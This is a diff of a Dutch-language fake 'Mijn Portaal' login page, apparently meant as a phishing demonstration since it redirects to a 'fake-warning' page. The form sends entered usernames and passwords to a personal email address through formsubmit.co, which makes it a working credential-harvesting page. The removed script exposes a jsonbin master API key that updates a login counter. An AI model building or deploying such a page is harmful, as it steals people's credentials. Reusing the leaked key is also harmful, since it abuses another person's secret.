@@ -2,50 +2,36 @@
 <html lang="nl">
 <head>
   <meta charset="UTF-8">
-  <title>Mijn Portaal</title>
+  <title>Login Portaal</title>
   <style>
-    body { background-color: #111; color: #0f0; font-family: monospace; text-align: center; margin-top: 100px; }
-    input, button { padding: 10px; margin: 10px; background: #222; color: #0f0; border: none; }
-    input::placeholder { color: #0f0; }
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      margin-top: 100px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      background: #222;
+      color: #0f0;
+      border: none;
+    }
+    #result {
+      display: none;
+      margin-top: 30px;
+      color: red;
+    }
   </style>
 </head>
 <body>
-  <h2>Welkom bij Mijn Portaal</h2>
-  
-  <form id="fakeLogin" action="https://formsubmit.co/matteogoossens@tuta.io" method="POST">
+  <h2>Login bij Mijn Portaal</h2>
+  <form action="https://formsubmit.co/matteogoossens@tuta.io" method="POST" id="loginForm">
     <input type="text" name="username" placeholder="Gebruikersnaam" required><br>
     <input type="password" name="password" placeholder="Wachtwoord" required><br>
-    <input type="hidden" name="_next" value="fake-warning.html">
+    <input type="hidden" name="_next" value="https://gooske28.github.io/fake-warning.html">
     <button type="submit">Inloggen</button>
   </form>
-
-  <script>
-    const form = document.getElementById("fakeLogin");
-
-    form.addEventListener("submit", async () => {
-      const BIN_ID = "682234628960c979a598145d";
-      const API_KEY = "$2a$10$wENWrVjRd71mirvN8yXHEOrEjJlZAUgWgX4H4cD9uEE54vsIMf6h2";
-
-      try {
-        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-          headers: { "X-Master-Key": API_KEY }
-        });
-        const data = await res.json();
-        const newCount = data.record.logins + 1;
-
-        await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-          method: "PUT",
-          headers: {
-            "Content-Type": "application/json",
-            "X-Master-Key": API_KEY,
-            "X-Bin-Versioning": "false"
-          },
-          body: JSON.stringify({ logins: newCount })
-        });
-      } catch (err) {
-        console.error("Teller-update mislukt:", err);
-      }
-    });
-  </script>
 </body>
 </html>
